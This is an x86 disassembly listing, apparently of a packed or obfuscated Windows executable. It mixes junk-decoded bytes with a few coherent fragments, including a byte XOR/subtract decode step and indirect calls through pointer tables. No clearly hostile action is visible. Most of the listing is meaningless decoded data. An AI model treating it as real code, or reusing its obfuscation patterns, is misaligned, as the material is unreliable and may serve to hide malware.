  405129:	out    dx,al
  40512a:	push   eax
  40512b:	xlat   BYTE PTR ds:[ebx]
  40512c:	dec    eax
  40512d:	dec    ecx
  40512e:	not    esi
  405130:	(bad)  
  405131:	lods   al,BYTE PTR ds:[esi]
  405132:	mov    edx,0xc11e2647
  405137:	mov    al,0x54
  405139:	add    DWORD PTR ss:[esi+0x47],0xffffff9c
  40513e:	adc    BYTE PTR [ebx-0x51774bdc],bl
  405144:	inc    ecx
  405145:	div    BYTE PTR [edx]
  405147:	cld    
  405148:	fwait
  405149:	iret   
  40514a:	idiv   DWORD PTR [ecx+0x416f6e98]
  405150:	in     eax,0x83
  405152:	rol    edi,0x50
  405155:	mov    DWORD PTR ds:0x4122e8,0x10
  40515f:	cmp    DWORD PTR ds:0x4122e8,0x0
  405166:	je     0x4051ac
  40516c:	cmp    DWORD PTR ds:0x4122e8,0x4
  405173:	jne    0x405184
  405179:	push   0x41502d
  40517e:	call   DWORD PTR ds:0x40d1c8
  405184:	cmp    DWORD PTR ds:0x4122e8,0x5
  40518b:	jne    0x40519c
  405191:	mov    eax,ds:0x4122e8
  405196:	dec    eax
  405197:	mov    ds:0x4122e8,eax
  40519c:	mov    eax,ds:0x4122e8
  4051a1:	dec    eax
  4051a2:	mov    ds:0x4122e8,eax
  4051a7:	jmp    0x40515f
  4051ac:	mov    eax,DWORD PTR [ebp-0x1c]
  4051af:	xor    eax,esi
  4051b1:	add    eax,edi
  4051b3:	jmp    0x40532c
  4051b8:	(bad)  
  4051b9:	sbb    BYTE PTR [ecx+eiz*1],ah
  4051bc:	clc    
  4051bd:	and    ebx,ebp
  4051bf:	fldcw  WORD PTR [esi+0x6f0f9672]
  4051c5:	scas   al,BYTE PTR es:[edi]
  4051c6:	ja     0x4051c5
  4051c8:	dec    edx
  4051c9:	jo     0x405249
  4051cb:	jle    0x4051a7
  4051cd:	jg     0x40524d
  4051cf:	jle    0x405245
  4051d1:	test   al,0xa
  4051d3:	outs   dx,BYTE PTR ds:[esi]
  4051d4:	fst    DWORD PTR [eax]
  4051d6:	daa    
  4051d7:	fimul  WORD PTR [edi]
  4051d9:	adc    bl,BYTE PTR [edi+0x17eb4053]
  4051df:	mov    ecx,0x3219d82f
  4051e4:	dec    edx
  4051e5:	xchg   ebx,eax
  4051e6:	je     0x405224
  4051e8:	call   0xa3f85b6f
  4051ed:	out    0xba,al
  4051ef:	adc    al,0x14
  4051f1:	inc    edx
  4051f2:	xor    al,0xb0
  4051f4:	das    
  4051f5:	scas   al,BYTE PTR es:[edi]
  4051f6:	repnz pop ss
  4051f8:	push   ebp
  4051f9:	xchg   ebx,eax
  4051fa:	rol    edi,1
  4051fc:	popf   
  4051fd:	inc    esi
  4051fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051ff:	int    0x6d
  405201:	fmul   DWORD PTR [esp+edx*8+0x69]
  405205:	lahf   
  405206:	xchg   edi,eax
  405207:	jae    0x405220
  405209:	add    esi,DWORD PTR [ebp+0x6cbd471]
  40520f:	idiv   BYTE PTR [esi]
  405211:	dec    edx
  405212:	out    0xe8,al
  405214:	daa    
  405215:	test   eax,0x724b418b
  40521a:	inc    esp
  40521b:	mov    WORD PTR [ebp+0x1b995ff7],cs
  405221:	sub    ah,BYTE PTR [edi+0x34]
  405224:	xchg   ebx,eax
  405225:	push   0xfa0852ba
  40522a:	xchg   ecx,eax
  40522b:	fs clc 
  40522d:	mov    ds:0x1a557f89,al
  405232:	aam    0xb3
  405234:	sbb    eax,esi
  405236:	leave  
  405237:	sti    
  405238:	jge    0x405267
  40523a:	rol    BYTE PTR [ebp-0x2bad8bf],0x8d
  405241:	enter  0x2bf1,0x6e
  405245:	mov    eax,ds:0xf3d2ea91
  40524a:	pop    es
  40524b:	push   es
  40524c:	mov    edx,0xbbdca133
  405251:	in     eax,0x3b
  405253:	sbb    eax,0xa0693203
  405258:	(bad)  
  405259:	or     BYTE PTR [eax+eiz*2],bl
  40525c:	xchg   edi,eax
  40525d:	ja     0x40522c
  40525f:	inc    ecx
  405260:	js     0x405277
  405262:	inc    eax
  405263:	pop    ebp
  405264:	in     al,dx
  405265:	mov    edi,ecx
  405267:	cmp    BYTE PTR [ebx-0x7d330159],ah
  40526d:	sub    eax,0x51f887c2
  405272:	cmp    al,0x57
  405274:	test   BYTE PTR [eax+0x538da43e],0x89
  40527b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40527c:	mov    dh,0x68
  40527e:	adc    BYTE PTR [edx-0x42d55a74],0xd2
  405285:	mov    DWORD PTR [esi+0x53bc4eeb],edx
  40528b:	cmp    edx,edx
  40528d:	test   DWORD PTR [ebx+0xf],esp
  405290:	fimul  DWORD PTR [ecx-0x78]
  405293:	neg    DWORD PTR [esi+ebx*1+0x7d]
  405297:	xchg   esi,eax
  405298:	inc    ebp
  405299:	repnz adc dl,dh
  40529c:	push   eax
  40529d:	mov    ah,0x99
  40529f:	call   0x6c9ba880
  4052a4:	adc    ah,ah
  4052a6:	addr16 push ds
  4052a8:	xor    al,0x64
  4052aa:	push   0x9668bda0
  4052af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052b0:	xchg   esi,eax
  4052b1:	pop    ebx
  4052b2:	push   ss
  4052b3:	fsub   st(6),st
  4052b5:	push   es
  4052b6:	inc    edx
  4052b7:	jp     0x40531b
  4052b9:	xchg   BYTE PTR [edx],dh
  4052bb:	dec    eax
  4052bc:	and    DWORD PTR [esi-0x1819c16b],ecx
  4052c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052c3:	lock pushf 
  4052c5:	xor    dh,al
  4052c7:	repz int3 
  4052c9:	mov    eax,ds:0x7b23f23
  4052ce:	adc    al,dh
  4052d0:	gs int 0x52
  4052d3:	sub    ebp,ebp
  4052d5:	adc    DWORD PTR [ecx-0x5e],ecx
  4052d8:	jg     0x40534c
  4052da:	jo     0x4052f9
  4052dc:	adc    ecx,eax
  4052de:	retf   
  4052df:	pop    ebx
  4052e0:	pop    ds
  4052e1:	or     BYTE PTR [ecx+0x77e8b51d],dl
  4052e7:	cmp    al,0x24
  4052e9:	test   eax,0x2ad34849
  4052ee:	mov    bh,0x88
  4052f0:	inc    eax
  4052f1:	sub    al,0xc7
  4052f3:	pop    edi
  4052f4:	and    al,0xa6
  4052f6:	mov    DWORD PTR [edi+ebp*8+0x5767b81b],ebp
  4052fd:	xchg   edi,eax
  4052fe:	je     0x405291
  405300:	repz addr16 sti 
  405303:	mov    ebp,0x8f21efb0
  405308:	fmul   st,st(7)
  40530a:	inc    ecx
  40530b:	dec    eax
  40530c:	cmp    DWORD PTR [bp+0x7140],ebp
  405311:	mov    edx,0xe9aa8801
  405316:	xor    esi,edi
  405318:	cld    
  405319:	call   0xdfc5:0x59fbc20c
  405320:	hlt    
  405321:	cmp    al,BYTE PTR [edx-0x5]
  405324:	and    ch,BYTE PTR [ecx]
  405326:	pop    edi
  405327:	mov    ah,0xa2
  405329:	xor    edi,DWORD PTR [edx+0x75ff5005]
  40532f:	clc    
  405330:	lea    eax,[ebp-0x78]
  405333:	push   eax
  405334:	push   DWORD PTR [ebp-0xc]
  405337:	push   DWORD PTR [ebp-0x14]
  40533a:	jmp    0x4054b3
  40533f:	loop   0x40534f
  405341:	cli    
  405342:	cs cli 
  405344:	cli    
  405345:	cli    
  405346:	ret    0x10db
  405349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40534a:	push   esp
  40534b:	xor    DWORD PTR ds:0x7616d0b7,esp
  405351:	jle    0x4053d1
  405353:	fidivr DWORD PTR [edi+0x7e]
  405356:	jle    0x40533c
  405358:	clc    
  405359:	iret   
  40535a:	fsub   DWORD PTR [ecx+ebp*2]
  40535d:	cdq    
  40535e:	and    ah,al
  405360:	mov    ah,0xb1
  405362:	sbb    al,0xbd
  405364:	mov    ebp,0xeb1fc4e
  405369:	fisubr DWORD PTR ds:0xebd3457d
  40536f:	and    eax,0x6b6bf5af
  405374:	xchg   ebp,eax
  405375:	xor    eax,0x504a577c
  40537a:	ds in  eax,0xb5
  40537d:	stos   DWORD PTR es:[edi],eax
  40537e:	push   esp
  40537f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405380:	rol    BYTE PTR [ecx],cl
  405382:	dec    ebp
  405383:	jmp    0x4053c7
  405385:	out    0xb1,eax
  405387:	or     ah,bl
  405389:	rcr    ecx,1
  40538b:	in     eax,0x24
  40538d:	push   ebp
  40538e:	arpl   ax,si
  405390:	adc    edx,DWORD PTR [ebx+eax*2]
  405393:	jmp    0x5385:0xda8abe0c
  40539a:	test   al,0xd3
  40539c:	(bad)  
  40539d:	push   ecx
  40539e:	icebp  
  40539f:	loope  0x40535a
  4053a1:	xchg   edx,eax
  4053a2:	popa   
  4053a3:	loope  0x40538d
  4053a5:	data16 (bad) 
  4053a7:	outs   dx,BYTE PTR ds:[esi]
  4053a8:	not    DWORD PTR [edx+0x517888ad]
  4053ae:	xchg   esi,eax
  4053af:	xchg   DWORD PTR [edi],ecx
  4053b1:	cs jp  0x405400
  4053b4:	out    0xb1,eax
  4053b6:	and    ch,dh
  4053b8:	cli    
  4053b9:	jnp    0x405384
  4053bb:	adc    DWORD PTR [ebp+0x27fdc675],esp
  4053c1:	shr    BYTE PTR [esi],cl
  4053c3:	and    DWORD PTR [ebx],eax
  4053c5:	fisub  WORD PTR [ebx+0x65]
  4053c8:	fist   WORD PTR [ecx]
  4053ca:	test   DWORD PTR [edi+0x17],0xb20fb292
  4053d1:	jmp    0x4053cc
  4053d3:	out    0x2,al
  4053d5:	sbb    edx,DWORD PTR [eax]
  4053d7:	pop    ds
  4053d8:	test   al,0xa7
  4053da:	sub    esi,DWORD PTR [esi-0x50]
  4053dd:	mov    esp,0xc373f858
  4053e2:	cdq    
  4053e3:	jne    0x40539b
  4053e5:	xchg   ecx,eax
  4053e6:	jecxz  0x40539a
  4053e8:	and    al,0xec
  4053ea:	dec    edx
  4053eb:	mov    esp,0x6e50bc0d
  4053f0:	cmp    eax,DWORD PTR [edi+0x73]
  4053f3:	js     0x405456
  4053f5:	and    dl,cl
  4053f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053f8:	test   DWORD PTR [ebx+0x1e6a283c],0xb7957c37
  405402:	jnp    0x4053d4
  405404:	push   esi
  405405:	inc    ecx
  405406:	in     al,0x4f
  405408:	sub    eax,0x6db85c28
  40540d:	fnsave [eax+0x90f4428]
  405413:	dec    edx
  405414:	stc    
  405415:	inc    ecx
  405416:	xchg   ecx,eax
  405417:	daa    
  405418:	mov    ch,0x97
  40541a:	sub    BYTE PTR ds:0x8f254b39,cl
  405420:	xor    eax,0x34359dad
  405425:	dec    edx
  405426:	cmp    eax,0x51a910b3
  40542b:	out    0x6e,al
  40542d:	loopne 0x40548e
  40542f:	lods   al,BYTE PTR ds:[esi]
  405430:	push   es
  405431:	or     eax,0x91cd972e
  405436:	fld    DWORD PTR ds:0x4a84b3bf
  40543c:	stos   DWORD PTR es:[edi],eax
  40543d:	retf   
  40543e:	jbe    0x4054bd
  405440:	pop    esp
  405441:	mov    eax,ds:0x9c133074
  405446:	jnp    0x405403
  405448:	xchg   esp,eax
  405449:	fisub  WORD PTR [edi]
  40544b:	(bad)  
  40544c:	lahf   
  40544d:	rol    DWORD PTR [ebx+0x62],0xa5
  405451:	jo     0x4054a2
  405453:	pop    ds
  405454:	adc    BYTE PTR [esi],ah
  405456:	les    esi,FWORD PTR [ebx+0x1248cee8]
  40545c:	fisubr DWORD PTR [esi-0x64]
  40545f:	(bad)  
  405460:	in     al,dx
  405461:	mov    ds:0xe60b86ab,eax
  405466:	jl     0x40544b
  405468:	pop    edi
  405469:	dec    eax
  40546a:	(bad)  
  40546b:	scas   al,BYTE PTR es:[edi]
  40546c:	cmp    al,0xeb
  40546e:	jl     0x4054eb
  405470:	dec    edx
  405471:	and    eax,0x5922e1c9
  405476:	sub    al,0x60
  405478:	cli    
  405479:	or     WORD PTR [eax+0x7e335620],dx
  405480:	xchg   BYTE PTR [edi-0x31],dl
  405483:	fistp  WORD PTR [ebx+0x68]
  405486:	clc    
  405487:	or     bl,BYTE PTR [eax-0x54ef875d]
  40548d:	leave  
  40548e:	jg     0x4054a3
  405490:	push   ss
  405491:	push   edx
  405492:	mov    esi,esi
  405494:	sahf   
  405495:	ins    BYTE PTR es:[edi],dx
  405496:	pop    es
  405497:	enter  0x4b06,0x96
  40549b:	sub    DWORD PTR [esi+ebp*2],edi
  40549e:	sub    BYTE PTR [ebp+0x27],ah
  4054a1:	pop    eax
  4054a2:	not    DWORD PTR [ebp-0x29fb8cc6]
  4054a8:	xor    DWORD PTR [edi-0x34],eax
  4054ab:	dec    esp
  4054ac:	jg     0x40543b
  4054ae:	rol    BYTE PTR [ebx-0x177d0b08],cl
  4054b4:	dec    edi
  4054b5:	inc    ecx
  4054b6:	add    BYTE PTR [eax],al
  4054b8:	test   eax,eax
  4054ba:	je     0x4054e5
  4054c0:	lea    eax,[ebp-0x78]
  4054c3:	push   eax
  4054c4:	mov    eax,DWORD PTR [ebp-0x14]
  4054c7:	xor    eax,esi
  4054c9:	add    eax,edi
  4054cb:	push   eax
  4054cc:	mov    eax,DWORD PTR [ebp-0x10]
  4054cf:	add    eax,0xee
  4054d4:	push   eax
  4054d5:	mov    eax,DWORD PTR [ebp-0x10]
  4054d8:	mov    eax,DWORD PTR [eax+0x198]
  4054de:	push   DWORD PTR [eax]
  4054e0:	call   0x40ae4d
  4054e5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4054e8:	xor    ecx,esi
  4054ea:	mov    eax,0xffcd8d61
  4054ef:	sub    eax,ecx
  4054f1:	sub    eax,DWORD PTR [ebp-0x8]
  4054f4:	mov    ecx,DWORD PTR [ebp-0x30]
  4054f7:	add    ecx,eax
  4054f9:	mov    eax,DWORD PTR [ebp-0x8]
  4054fc:	jmp    0x405675
  405501:	lahf   
  405502:	(bad)  
  405503:	icebp  
  405504:	shl    DWORD PTR [ecx-0x50bea01f],1
  40550a:	icebp  
  40550b:	add    DWORD PTR [edi-0xd],0xffffffba
  40550f:	dec    edx
  405510:	adc    eax,0x7e7e77f2
  405515:	fidivr DWORD PTR [edi+0x7e]
  405518:	jle    0x40551b
  40551a:	call   0x5f5b:0x1d9c8d94
  405521:	pop    esi
  405522:	ficomp WORD PTR [edx-0x119e16e1]
  405528:	mov    eax,ecx
  40552a:	jle    0x40558e
  40552c:	fcom   QWORD PTR [eax-0x40]
  40552f:	xor    dl,BYTE PTR [ebp-0x6a67f951]
  405535:	dec    ebp
  405536:	push   0xffffffeb
  405538:	fldln2 
  40553a:	shl    BYTE PTR [eax],cl
  40553c:	xchg   DWORD PTR [edx+0x8cc96cc],eax
  405542:	xor    al,0x0
  405544:	pop    edi
  405545:	add    BYTE PTR ds:0x2dac646c,cl
  40554b:	punpckhbw mm3,QWORD PTR [edx-0x13]
  40554f:	pop    ebp
  405550:	jmp    0x4852:0x83b4972d
  405557:	shl    DWORD PTR [ebp-0x244d4aff],cl
  40555d:	dec    esi
  40555e:	rcr    eax,cl
  405560:	mov    ebp,0x860c9c41
  405565:	jecxz  0x4055e4
  405567:	repz lds esp,FWORD PTR [edx]
  40556a:	dec    edx
  40556b:	pop    ds
  40556c:	in     eax,dx
  40556d:	lea    ebx,[esi-0xbe8f5ac]
  405573:	and    DWORD PTR [edx+0x74],ecx
  405576:	mov    ch,0x5
  405578:	cld    
  405579:	ins    BYTE PTR es:[edi],dx
  40557a:	add    BYTE PTR [eax-0x46],0x50
  40557e:	sbb    edi,DWORD PTR [edx]
  405580:	fs stos BYTE PTR es:[edi],al
  405582:	mov    ds,WORD PTR [ebp+0x5a]
  405585:	and    eax,0xc1f558f5
  40558a:	jne    0x4055ff
  40558c:	rcr    DWORD PTR [ebx],0xb8
  40558f:	mov    DWORD PTR [eax-0xc],eax
  405592:	add    dl,ah
  405594:	dec    BYTE PTR [eax+0x14]
  405597:	jb     0x405554
  405599:	jns    0x4055e3
  40559b:	add    bh,BYTE PTR [edi+edx*8-0x3a]
  40559f:	mov    ds:0xc72174ad,al
  4055a4:	test   DWORD PTR [esi+0x35],esp
  4055a7:	pop    esi
  4055a8:	fst    QWORD PTR [eax+0x66ee0df9]
  4055ae:	sbb    DWORD PTR ss:[edi+ecx*2+0x2a31b112],ecx
  4055b6:	inc    eax
  4055b7:	outs   dx,DWORD PTR ds:[esi]
  4055b8:	fdivr  DWORD PTR [esi]
  4055ba:	jo     0x4055a1
  4055bc:	inc    ecx
  4055bd:	or     esp,DWORD PTR [ebx]
  4055bf:	push   es
  4055c0:	cmp    eax,0xb88c3bd4
  4055c5:	mul    DWORD PTR ds:0xae864034
  4055cb:	push   esp
  4055cc:	retf   
  4055cd:	sbb    DWORD PTR [esi+ebx*1-0x52],ecx
  4055d1:	pop    ss
  4055d2:	loope  0x4055b2
  4055d4:	cmp    edx,DWORD PTR [eax]
  4055d6:	out    0x9,eax
  4055d8:	cmp    BYTE PTR [ecx],ch
  4055da:	loopne 0x4055fe
  4055dc:	or     DWORD PTR [ebp+0x640892fe],ebx
  4055e2:	cmp    eax,0x8d45a5
  4055e7:	xchg   DWORD PTR [edi+0x16],esi
  4055ea:	cmp    BYTE PTR [edx],cl
  4055ec:	imul   ecx,DWORD PTR cs:[ebp+0x655f7a7a],0xa22fefb
  4055f7:	shr    eax,1
  4055f9:	test   DWORD PTR [ecx-0x6],edx
  4055fc:	jo     0x40567d
  4055fe:	sbb    BYTE PTR [edx+0x24],0xeb
  405602:	mov    dh,0x9b
  405604:	stos   BYTE PTR es:[edi],al
  405605:	jmp    0xfc600514
  40560a:	mov    bh,0xb0
  40560c:	dec    ebp
  40560d:	and    edi,DWORD PTR [edi]
  40560f:	add    dh,BYTE PTR [ecx-0x4a80a92b]
  405615:	hlt    
  405616:	sbb    edi,esi
  405618:	leave  
  405619:	sbb    edi,DWORD PTR [eax+esi*4]
  40561c:	sbb    al,0x7d
  40561e:	fiadd  DWORD PTR [esi-0x1f]
  405621:	cmp    al,0xcc
  405623:	jnp    0x405641
  405625:	rol    BYTE PTR [esi],0x9c
  405628:	jo     0x405634
  40562a:	fnstsw WORD PTR [eax]
  40562c:	rcl    cl,1
  40562e:	xchg   edi,eax
  40562f:	int3   
  405630:	out    dx,al
  405631:	sbb    BYTE PTR [edx],dh
  405633:	adc    ah,dl
  405635:	jo     0x405666
  405637:	dec    edx
  405638:	pop    edi
  405639:	push   ecx
  40563a:	sub    ebp,DWORD PTR ds:0xbf70e1b
  405640:	repnz fnstenv [ebx+0x3ef1f8e1]
  405647:	adc    ebx,DWORD PTR ds:0xb0dd19c7
  40564d:	mov    DWORD PTR [ecx+0xc],0xb1922462
  405654:	mov    es,edi
  405656:	cli    
  405657:	add    BYTE PTR [edx-0x4a],ch
  40565a:	and    bh,BYTE PTR [ecx+0x121aca34]
  405660:	hlt    
  405661:	mov    edi,0x99f0347b
  405666:	repz cdq 
  405668:	add    eax,0x55b3f860
  40566d:	dec    ebx
  40566e:	inc    edi
  40566f:	retf   0x9cd6
  405672:	aad    0x51
  405674:	sahf   
  405675:	mov    DWORD PTR [eax+0x1],ecx
  405678:	mov    al,BYTE PTR [ebp-0x1]
  40567b:	mov    ecx,DWORD PTR [ebp-0x8]
  40567e:	xor    al,0x4a
  405680:	sub    al,0x34
  405682:	mov    BYTE PTR [ecx],al
  405684:	lea    eax,[ebp-0x8]
  405687:	inc    BYTE PTR [eax]
  405689:	inc    eax
  40568a:	push   eax
  40568b:	pop    ecx
  40568c:	dec    ecx
  40568d:	xchg   ecx,edx
  40568f:	jmp    0x405808
  405694:	mov    gs,WORD PTR [edi+0x79]
  405697:	in     eax,0x79
  405699:	stc    
  40569a:	and    BYTE PTR [ebp-0x3],0xf5
  40569e:	cmp    esp,eax
  4056a0:	je     0x405669
  4056a2:	test   BYTE PTR [edi],0x5e
  4056a5:	je     0x405725
  4056a7:	jle    0x405683
  4056a9:	jg     0x405729
  4056ab:	jle    0x40570b
  4056ad:	mov    WORD PTR [ebx+0x2b67bf6a],?
  4056b3:	div    DWORD PTR [edx]
  4056b5:	push   edi
  4056b6:	mov    ecx,0x2f129e75
  4056bb:	gs and al,0x5d
  4056be:	js     0x4056e3
  4056c0:	pop    ss
  4056c1:	out    dx,al
  4056c2:	pop    edx
  4056c3:	mov    edx,0x38fded48
  4056c8:	(bad)  
  4056c9:	cmp    eax,ebx
  4056cb:	and    dl,BYTE PTR [ecx+edi*2-0x67]
  4056cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056d0:	dec    ecx
  4056d1:	adc    bl,BYTE PTR [eax-0x20]
  4056d4:	pop    ebx
  4056d5:	rcr    esp,cl
  4056d7:	cmp    DWORD PTR ds:0xb0e2a798,ebx
  4056dd:	or     eax,0x12c25513
  4056e2:	mov    dl,0xb1
  4056e4:	in     al,dx
  4056e5:	fsub   QWORD PTR [edx-0x282ad587]
  4056eb:	cmp    edi,ebx
  4056ed:	adc    BYTE PTR [edi+0x46],cl
  4056f0:	out    0x74,eax
  4056f2:	repz push edx
  4056f4:	mov    bl,0xa5
  4056f6:	mov    fs,WORD PTR ds:0x71d7f813
  4056fc:	ficomp WORD PTR ds:0x5cd5fb69
  405702:	and    dh,BYTE PTR [ecx+0x4b97d1a9]
  405708:	test   DWORD PTR [ebx-0x56],ebp
  40570b:	loope  0x4056d1
  40570d:	out    0x62,al
  40570f:	xchg   ebp,ebp
  405711:	jns    0x405707
  405713:	scas   eax,DWORD PTR es:[edi]
  405714:	mov    BYTE PTR [ecx],al
  405716:	pop    ebx
  405717:	inc    ebp
  405718:	sbb    ah,ah
  40571a:	aad    0x24
  40571c:	loopne 0x40575a
  40571e:	iret   
  40571f:	loope  0x405741
  405721:	mov    dh,ah
  405723:	dec    ecx
  405724:	adc    edx,DWORD PTR [ecx]
  405726:	into   
  405727:	and    al,0x3f
  405729:	test   al,0x11
  40572b:	dec    ebx
  40572c:	loop   0x405773
  40572e:	cmp    al,0xe7
  405730:	inc    BYTE PTR [edx+ebp*8-0x36c98617]
  405737:	scas   eax,DWORD PTR es:[edi]
  405738:	jne    0x40575d
  40573a:	cld    
  40573b:	and    BYTE PTR [esi+eiz*4],dl
  40573e:	cmp    eax,0xb4192d66
  405743:	daa    
  405744:	sti    
  405745:	(bad)  
  405746:	in     al,0x7
  405748:	pop    ss
  405749:	adc    al,0x7b
  40574b:	les    ebx,FWORD PTR [edi]
  40574d:	lods   eax,DWORD PTR ds:[esi]
  40574e:	out    0xb7,eax
  405750:	je     0x4057cc
  405752:	ja     0x405724
  405754:	int    0x7a
  405756:	leave  
  405757:	in     eax,0xe4
  405759:	loope  0x40571b
  40575b:	inc    ecx
  40575c:	push   0x4927b42d
  405761:	pusha  
  405762:	popf   
  405763:	leave  
  405764:	push   ecx
  405765:	out    0x3c,al
  405767:	push   eax
  405768:	pop    esi
  405769:	dec    ecx
  40576a:	clc    
  40576b:	sbb    al,BYTE PTR ds:0x61dcc7b0
  405771:	inc    ecx
  405772:	test   DWORD PTR [esi],0x833adcb4
  405778:	jne    0x40572b
  40577a:	or     eax,DWORD PTR [eax]
  40577c:	jnp    0x405735
  40577e:	fld1   
  405780:	std    
  405781:	sar    DWORD PTR [esi-0x1a09a18f],0xe5
  405788:	imul   cl
  40578a:	imul   esi,DWORD PTR [ebx+0x7cc157ef],0xffffffad
  405791:	daa    
  405792:	sub    al,0x23
  405794:	dec    eax
  405795:	loopne 0x4057d2
  405797:	jb     0x4057d1
  405799:	(bad)  
  40579a:	bound  esi,QWORD PTR [ebp+0x1eb2a313]
  4057a0:	into   
  4057a1:	xor    al,0x6d
  4057a3:	jl     0x4057d3
  4057a5:	lods   eax,DWORD PTR ds:[esi]
  4057a6:	nop
  4057a7:	(bad)  
  4057a9:	loopne 0x4057a3
  4057ab:	retf   0xc339
  4057ae:	jmp    0x405769
  4057b0:	outs   dx,BYTE PTR ds:[esi]
  4057b1:	fucomp st(1)
  4057b3:	push   ebp
  4057b4:	inc    esi
  4057b5:	add    al,0xe7
  4057b7:	outs   dx,WORD PTR gs:[esi]
  4057ba:	hlt    
  4057bb:	lods   eax,DWORD PTR ds:[esi]
  4057bc:	dec    edi
  4057bd:	push   edi
  4057be:	mov    eax,0xdc51e36a
  4057c3:	mov    edi,0xd52d3a53
  4057c8:	cmp    edi,DWORD PTR [eax]
  4057ca:	pop    ecx
  4057cb:	int    0x56
  4057cd:	sub    ebx,DWORD PTR [esi+0x66]
  4057d0:	lods   al,BYTE PTR ds:[esi]
  4057d1:	and    BYTE PTR [ecx+ecx*4+0x14],cl
  4057d5:	push   eax
  4057d6:	dec    ebp
  4057d8:	rcr    esi,0x19
  4057db:	ret    
  4057dc:	repnz mov BYTE PTR [edi+0x613294b8],cl
  4057e3:	sbb    eax,0x38d14d5
  4057e8:	mov    dh,0x1d
  4057ea:	add    bl,BYTE PTR [eax-0x1f]
  4057ed:	lods   eax,DWORD PTR ds:[esi]
  4057ee:	ror    BYTE PTR [esi-0x545dff9c],0xcd
  4057f5:	ret    0xeea6
  4057f8:	dec    eax
  4057f9:	scas   eax,DWORD PTR es:[edi]
  4057fa:	mov    dl,0x44
  4057fc:	push   ecx
  4057fd:	or     al,0x99
  4057ff:	fnstenv [esi-0x7b]
  405802:	ins    BYTE PTR es:[edi],dx
  405803:	arpl   WORD PTR [ebx+ecx*1],cx
  405806:	jae    0x4057d2
  405808:	dec    BYTE PTR [edx]
  40580a:	push   DWORD PTR [ebp-0x10]
  40580d:	mov    eax,ds:0x40d68c
  405812:	mov    eax,DWORD PTR [eax]
  405814:	push   DWORD PTR [eax]
  405816:	lea    eax,ds:0x40d6a8
  40581c:	push   DWORD PTR [eax]
  40581e:	lea    eax,ds:0x40d454
  405824:	push   DWORD PTR [eax]
  405826:	lea    eax,ds:0x40d688
  40582c:	push   DWORD PTR [eax]
  40582e:	lea    eax,ds:0x40d784
  405834:	push   DWORD PTR [eax]
  405836:	xchg   ebx,edx
  405838:	inc    ebx
  405839:	inc    ebx
  40583a:	sub    ebx,0x3
  40583d:	push   ebx
  40583e:	pop    eax
  40583f:	call   DWORD PTR [eax+0x1]
  405842:	mov    eax,DWORD PTR [ebp-0x20]
  405845:	jmp    0x4059be
  40584a:	mov    WORD PTR [edx+ebx*8+0x33],es
  40584e:	fidiv  DWORD PTR [ecx+0x8615985]
  405854:	or     al,0x32
  405856:	stos   BYTE PTR es:[edi],al
  405857:	mov    bh,0x9
  405859:	pop    esi
  40585a:	cmp    cl,BYTE PTR [edx]
  40585c:	jle    0x4058dc
  40585e:	fidivr DWORD PTR [edi+0x7e]
  405861:	jle    0x405892
  405863:	ficom  DWORD PTR [esi+esi*4]
  405866:	and    eax,0x22da42c5
  40586b:	(bad)  
  40586c:	and    DWORD PTR [ebx+0x7e],ecx
  40586f:	repnz mov ebp,0x6972c24e
  405875:	sbb    BYTE PTR [ebx+0x69],0xb8
  405879:	and    DWORD PTR [edi+edi*8+0x5a],ebp
  40587d:	sti    
  40587e:	mov    dl,0xdf
  405880:	dec    edx
  405881:	outs   dx,BYTE PTR ds:[esi]
  405882:	sub    esp,DWORD PTR [edi+0x1d]
  405885:	jp     0x4058cf
  405887:	mov    dl,0x11
  405889:	sbb    eax,0x76
  40588c:	gs adc cl,dl
  40588f:	jmp    0x405869
  405891:	test   DWORD PTR [edi-0x3464d790],0xa52576ab
  40589b:	add    ah,dh
  40589d:	fnstcw WORD PTR [ebp-0x22]
  4058a0:	lahf   
  4058a1:	xchg   esi,eax
  4058a2:	xchg   BYTE PTR [edi-0x4d],bl
  4058a5:	je     0x4058d5
  4058a7:	jmp    0x59528ae2
  4058ac:	and    al,0xa2
  4058ae:	out    0x6,eax
  4058b0:	(bad)  [eax+0x16895ce1]
  4058b6:	inc    esp
  4058b7:	jmp    0x4058c9
  4058b9:	and    ebx,esi
  4058bb:	cmp    eax,DWORD PTR [edi]
  4058bd:	ficomp DWORD PTR [ecx-0x72]
  4058c0:	aad    0x36
  4058c2:	(bad)
  4058c6:	xchg   ecx,eax
  4058c7:	sub    bl,BYTE PTR [ebx+0x329f8181]
  4058cd:	jns    0x4058b3
  4058cf:	out    0x68,al
  4058d1:	add    dl,al
  4058d3:	enter  0x7db9,0x2
  4058d7:	jle    0x4058bd
  4058d9:	mov    BYTE PTR [ebp+0x73],al
  4058dc:	xchg   ecx,eax
  4058dd:	pop    es
  4058de:	jne    0x4058f9
  4058e0:	mov    cl,0xa7
  4058e2:	pop    esi
  4058e3:	pop    ecx
  4058e4:	push   ss
  4058e5:	mov    ?,esp
  4058e7:	mov    ecx,0xda4119ef
  4058ec:	stos   DWORD PTR es:[edi],eax
  4058ed:	mov    eax,ds:0xc00cfb18
  4058f2:	arpl   WORD PTR [esi+0x4f],bp
  4058f5:	repz mov eax,0x601f3546
  4058fb:	shr    BYTE PTR [eax+0x80963ec],1
  405901:	or     bl,bl
  405903:	cmp    dh,bl
  405905:	or     eax,DWORD PTR ds:0x64ce734e
  40590b:	stc    
  40590c:	adc    BYTE PTR [ebp-0x23],al
  40590f:	popf   
  405910:	ss in  al,dx
  405912:	and    BYTE PTR es:[ecx+0x13],al
  405916:	popa   
  405917:	dec    edi
  405918:	lods   eax,DWORD PTR ds:[esi]
  405919:	xchg   edi,eax
  40591a:	repz aas 
  40591c:	or     BYTE PTR [ecx+0x4b],dl
  40591f:	pop    edi
  405920:	and    ebp,DWORD PTR [eax+0x42]
  405923:	mov    edi,0x3217e08e
  405928:	push   es
  405929:	popa   
  40592a:	lea    ebx,[eax-0xceae603]
  405930:	or     edx,DWORD PTR [ebx-0x1c]
  405933:	in     eax,0x87
